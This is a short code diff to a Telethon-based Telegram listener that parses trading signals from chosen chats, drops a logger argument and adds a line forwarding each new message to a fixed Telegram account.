@@ -1,9 +1,8 @@
 from telethon import TelegramClient, events, utils
 from src.models.signal import Signal
-from logging import Logger
 from datetime import timedelta, datetime
 
-def run(client: TelegramClient, chat_ids: list, logger: Logger):
+def run(client: TelegramClient, chat_ids: list):
     @client.on(events.NewMessage(chats=chat_ids))
     async def handler(event: events.NewMessage.Event):
         # getting image, saved for later
@@ -20,3 +19,5 @@ def run(client: TelegramClient, chat_ids: list, logger: Logger):
             print(f"chat name: {chat_name}| {(datetime.now() + timedelta(hours=7))}| {signal.__dict__}")
         else:
             print(f"chat name: {chat_name}| {(datetime.now() + timedelta(hours=7))}| {text}")
+
+        await client.send_message("hieule151296", event.message)
